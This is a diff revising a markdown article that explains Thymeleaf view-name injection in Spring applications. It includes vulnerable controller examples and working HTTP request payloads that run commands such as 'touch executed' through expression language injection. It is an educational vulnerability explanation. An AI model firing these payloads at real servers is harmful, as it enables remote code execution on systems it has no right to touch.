@@ -1,4 +1,6 @@
-This article has shown how dangerous unrestricted manipulation of view names can be in the Spring Framework. Before doing that, let's look at a simple Spring application that uses Thymeleaf as its templating engine.
+# Views overview
+
+Consider a simple Spring application that uses Thymeleaf as its templating engine:
 
 ```java
 @Controller
@@ -12,13 +14,11 @@ public class HelloController {
 }
 ```
 
-This method will be called for every HTTP GET request for the root url `/`. It has no parameters and returns the static string `welcome`. Spring interprets `welcome` as the name of the View and tries to find the `resources/templates/welcome.html` file located in the application resources. If Spring finds it, renders a view from the template file and returns to the user.
+The `index` method will be called for every `GET` request for the root url `/`. It has no parameters and returns the static string `welcome`. Spring interprets `welcome` as the name of the `View` and tries to find the `resources/templates/welcome.html` file located in the application resources. If Spring finds it, renders a view from the template file and returns to the user.
 
 # Untrusted Thymeleaf view name
 
-> Whenever untrusted data comes to a view name returned by the controller, it can lead to expression language injection and hence RCE.
-
-If using the Thymeleaf view engine (the most popular for Spring), the template might look like this:
+If Thymeleaf view engine is used (the most popular for Spring), the template might look like this one:
 
 ```html
 <!DOCTYPE HTML>
@@ -32,18 +32,29 @@ If using the Thymeleaf view engine (the most popular for Spring), the template m
 </html>
 ```
 
-Thymeleaf engine support [file layouts](https://www.thymeleaf.org/doc/articles/layouts.html). For example, you can specify a fragment in the template by using `<div th:fragment="main">` and then request only this fragment from the view:
+Thymeleaf engine supports [file layouts](https://www.thymeleaf.org/doc/articles/layouts.html), that allows you to specify a fragment in the template by using `<div th:fragment="main">` and then request only this fragment from the view:
 
-```http
+```java
 @GetMapping("/main")
 public String fragment() {
     return "welcome :: main";
 }
 ```
 
-Thymeleaf is intelligent enough to return only the `main` div from the welcome view, not the whole document.
+Thymeleaf is intelligent enough to return only the main `div` from the `welcome` view, but not the whole document.
 
-Sometimes a situation arises when a template name or fragment is concatenated with untrusted data. For example, with a request parameter:
+Before loading the template from the filesystem, [Spring ThymeleafView](https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java) class parses the template name as an expression:
+
+```java
+try {
+   // By parsing it as a standard expression, we might profit from the expression cache
+   fragmentExpression = (FragmentExpression) parser.parseExpression(context, "~{" + viewTemplateName + "}");
+}
+```
+
+As a result, if template name or fragment is concatenated with untrusted data, it can lead to expression language injection and hence RCE.
+
+For instance, the following methods are vulnerable to expression language injection:
 
 ```java
 @GetMapping("/path")
@@ -58,19 +69,10 @@ public String fragment(@RequestParam String section) {
 }
 ```
 
-Before loading the template from the filesystem, [Spring ThymeleafView](https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java) class parses the template name as an expression:
-
-```java
-try {
-   // By parsing it as a standard expression, we might profit from the expression cache
-   fragmentExpression = (FragmentExpression) parser.parseExpression(context, "~{" + viewTemplateName + "}");
-}
-```
-
-Which leads to the possibility of exploitation of the expression language injection.
+The following request creates the `executed` file on the server:
 
 ```http
-GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
+GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("touch executed").getInputStream()).next()}__::.x HTTP/1.1
 Host: vulnerable-website.com
 ```
 
@@ -107,7 +109,7 @@ public String getViewName(HttpServletRequest request) {
 }
 ```
 
-Thus, it becomes vulnerable because the user controlled data (URI) comes in directly to view name and is resolved as an expression:
+So, it becomes vulnerable because the user controlled data (URI) comes in directly to view name and is resolved as an expression:
 
 ```http
 GET /doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x HTTP/1.1
